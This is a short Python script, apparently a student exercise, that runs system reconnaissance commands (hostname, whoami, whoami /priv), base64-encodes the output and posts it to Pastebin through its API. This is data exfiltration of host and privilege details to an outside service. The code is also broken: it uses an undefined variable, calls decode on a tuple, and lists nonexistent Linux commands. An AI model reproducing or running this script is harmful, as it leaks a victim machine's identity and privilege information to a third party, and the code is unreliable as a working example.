#Dhia Hauzan Muafa 2301926245
import subprocess
import os
import base64
import requests


def pastebin_func(data):
    link = 'https://pastebin.com/api/api_post.php'

    api ={'api_dev_key' : "" #masukkan api pastebinnya
        , 'api_paste_code' :  data_b64, 'api_option' : 'paste'}
    try:
        send = requests.post(link, data=api)
    except:
        print("Error")

def os_check():
    privwin = ["hostname","whoami","whoami /priv"]
    privlin = ["hostname", "user", "priviledges"]
    data=[]
    if os.name == "nt":
        priv = privwin
    else:
        priv = privlin
    for i in priv:
        subp = subprocess.Popen(args=i, stdout=subprocess.PIPE)
        strg=subp.communicate()
        data.append(strg.decode())
    data ="\n".join(data)
    data_b64 = base64.b64encode(data.encode('utf-8')).decode('utf-8')
    pastebin_func(data_b64)

  


def main():
    os_check()

if __name__ == '__main__':
    main()
